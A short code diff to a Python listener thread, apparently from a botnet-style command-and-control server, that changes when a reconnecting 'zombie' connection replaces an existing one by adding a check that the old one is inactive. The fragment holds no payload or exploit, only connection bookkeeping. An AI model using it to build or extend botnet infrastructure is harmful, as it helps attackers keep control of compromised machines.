@@ -20,7 +20,7 @@ class Listener(threading.Thread):
 	def addZombie(self, c, address):
 
 		for z in self.zombies:
-			if z.address == address:
+			if z.address == address and not z.active():
 				z.openedSocket.close()
 				z.openedSocket = c
 				return True
